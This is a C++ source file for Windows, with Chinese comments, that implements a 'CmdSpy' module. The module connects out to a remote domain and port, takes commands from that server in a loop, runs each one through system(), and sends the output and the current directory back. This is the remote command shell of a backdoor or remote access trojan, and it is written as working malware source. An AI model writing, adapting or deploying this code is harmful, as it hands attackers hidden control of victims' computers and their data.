#include "cmdspy.h"

// 互挤体，用来确保线程安全
static CRITICAL_SECTION gCs;
// 初始化类
static CmdSpy gSpy;
// 临时饭后信息保存路径
static std::string gTmpReturnFile = "cmd_return.tmp";

CmdSpy::CmdSpy()
{
    // 初始化互挤体
    InitializeCriticalSection(&gCs);
}

CmdSpy::~CmdSpy()
{
    // 删除互挤体
    DeleteCriticalSection(&gCs);
}

void CmdSpy::startByNewThread(std::string domain, int port)
{
    // 将域名和端口数据转换成一个字符指针类型
    char *args = new char[MAX_PATH+sizeof(int)];
    domain.reserve(MAX_PATH);
    memcpy(args,domain.data(), MAX_PATH);
    memcpy(args+MAX_PATH,(char*)&port, sizeof(int));

    // 创建新线程
    HANDLE h = CreateThread(NULL,0, CmdSpy::threadProc,(LPVOID)args,0,NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD CmdSpy::threadProc(LPVOID args)
{
    char domain[MAX_PATH];
    memcpy(domain, args, MAX_PATH);
    int port = *((int*)((char*)args+MAX_PATH));

    // 开始监控
    startCmdSpy(domain, port);

    // 释放参数
    delete (char *)args;
    return true;
}

void CmdSpy::startCmdSpy(std::string domain, int port)
{
    // 创建socket并连接至服务端
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect cmd spy server " <<
                     domain << ":" << port << std::endl;
        std::fflush(stdout);
        return;
    }

    // 开始监控消息
    std::cout << "Started cmd spy" << std::endl;
    std::fflush(stdout);

    // 死循环，不断从服务端接收数据
    const int packetSize = 800;
    char szData[packetSize];
    int ret;
    std::string buf;

    while (1) {
        ret = sock.recvData(szData, packetSize);

        // 出现错误
        if (ret == SOCKET_ERROR || ret == 0) {
            break;
        }

       // 把数据加入到缓冲区
       addDataToBuffer(&sock, buf, szData, ret);
    }

    // 完成
    std::cout << "Finished cmd spy" << std::endl;
    std::fflush(stdout);
}

void CmdSpy::addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int size)
{
    buf.append(data,size);

    // 把数据转换成指令模式
    int endIndex;
    while ((endIndex = buf.find(gSpy.CmdEnd)) >= 0) {
        std::string cmd = buf.substr(0,endIndex);
        buf.erase(0, endIndex+gSpy.CmdEnd.length());

        // 处理指令
        std::string retData = execCmd(cmd);
        // 发送Cmd命令返回数据到服务端
        sock->sendData(retData.data(), retData.size());

        // 发送当前文件位置
        std::string pwd = gSpy.CmdPwd;
        pwd.append(gSpy.CmdSplit);
        pwd.append(getPWD());

        // 发送Cmd命令返回数据到服务端
        sock->sendData(pwd.data(), pwd.size());
    }
}

std::string CmdSpy::execCmd(std::string cmd)
{
    // 锁定函数，其他线程不能进来
    EnterCriticalSection(&gCs);

    // 执行指令，然后保存在临时文件
    system(cmd.append(" > ").append(gTmpReturnFile).data());

    // 打开临时文件
    FILE *fp = fopen(gTmpReturnFile.data(), "rb");
    if (!fp) {
        std::cout << "Failed to open return file of cmd\n";
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);

        return std::string();
    }

    // 获取文件大小
    fseek(fp, 0, SEEK_END);
    unsigned int len = ftell(fp);
    rewind(fp);

    // 读取文件
    char data[len];
    fread(data, 1, len, fp);

    // 关闭文件
    fclose(fp);

    // 删除临时文件
    DeleteFileA(gTmpReturnFile.data());

    // 解除函数锁定
    LeaveCriticalSection(&gCs);

    return std::string(data, len);
}

std::string CmdSpy::getPWD()
{
    return execCmd("cd");
}
